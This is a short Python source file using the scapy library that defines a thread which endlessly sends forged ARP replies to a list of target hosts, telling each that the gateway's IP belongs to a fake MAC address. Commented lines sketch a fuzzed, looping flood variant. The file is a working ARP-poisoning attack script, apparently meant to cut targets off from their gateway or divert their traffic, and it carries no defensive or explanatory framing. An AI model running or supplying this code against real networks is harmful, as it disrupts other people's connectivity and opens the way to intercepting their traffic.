import threading
from scapy.all import ARP, Ether, sendp, fuzz, send


class atcThread(threading.Thread):
    def __init__(self, table, gtw_ip, gtw_mac):
        super(atcThread, self).__init__()
        self.table = table
        self.gtw_ip = gtw_ip
        self.gtw_mac = gtw_mac

    def run(self):
        ip_table = self.table[0]
        arp_table = self.table[1]
        while True:
            for i in range(len(ip_table)):
                tag_ip = ip_table[i]
                tag_mac = arp_table[tag_ip]
                eth = Ether(src=self.gtw_mac, dst=tag_mac)
                arp = ARP(hwsrc='01:02:03:04:05:06', psrc=self.gtw_ip, hwdst=tag_mac, pdst=tag_ip, op=2)
                pkt = eth / arp
                sendp(pkt)

                # pkt = eth/fuzz(arp)
                # send(pkt,loop=1)

